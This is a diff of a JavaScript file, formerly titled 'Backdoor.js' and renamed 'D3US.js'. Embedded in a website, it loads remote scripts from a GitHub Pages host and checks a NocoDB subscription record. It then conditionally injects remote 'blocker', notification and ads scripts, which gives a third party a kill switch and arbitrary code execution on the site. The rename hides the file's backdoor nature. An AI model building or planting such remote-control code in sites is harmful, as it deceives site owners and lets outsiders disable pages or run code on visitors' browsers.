@@ -1,15 +1,15 @@
 /*!
- * Backdoor.js v1.0.3a
+ * D3US.js
  * (c) 2024-2024
- * by Deus Notam
- * Telegram → https://t.me/d3usn0tam
+ * Made by Daniel Abros
+ * Telegram → https://t.me/abrosxd
  */
 
 if (!window.D3US) {
   console.log("%cD3US System%c - %cConnected!%c\n\nMade by Daniel Abros\nProject Site → https://deusnotam.github.io\nMy Telegram → https://t.me/abrosxd", "font-weight: bold;", "", "color: #25ba1a; font-weight: bold;", "");
 
   const activatorScript = document.createElement('script');
-  activatorScript.src = 'https://deusnotam.github.io/d3us/system/activator.js';
+  activatorScript.src = 'https://deusnotam.github.io/D3US/system/activator.js';
   document.head.appendChild(activatorScript);
 
   fetch('https://app.nocodb.com/api/v1/db/data/noco/p2kmbphsgvqs8kz/mpqof3e6f1ueozo/views/vwz1zne8sfxvhxco', {
@@ -63,9 +63,9 @@ if (!window.D3US) {
       const subscriptionDate = new Date(DeusSiteInfo.date);
 
       if (currentDate < subscriptionDate) {
-        if (DeusSiteInfo.blocker === "active") loadScript('https://deusnotam.github.io/d3us/system/blocker.js');
-        if (DeusSiteInfo.noti === "active") loadScript('https://deusnotam.github.io/d3us/system/noti.js');
-        if (DeusSiteInfo.ads === "active") loadScript('https://deusnotam.github.io/d3us/system/ads.js');
+        if (DeusSiteInfo.blocker === "active") loadScript('https://deusnotam.github.io/D3US/system/blocker.js');
+        if (DeusSiteInfo.noti === "active") loadScript('https://deusnotam.github.io/D3US/system/noti.js');
+        if (DeusSiteInfo.ads === "active") loadScript('https://deusnotam.github.io/D3US/system/ads.js');
       } else {
         console.log(`%cD3US System%c\n\nУ этого сайта закончилась подписка ${DeusSiteInfo.date}\nSubscription has expired for this site ${DeusSiteInfo.date}`, "font-weight: bold;", "");
       }
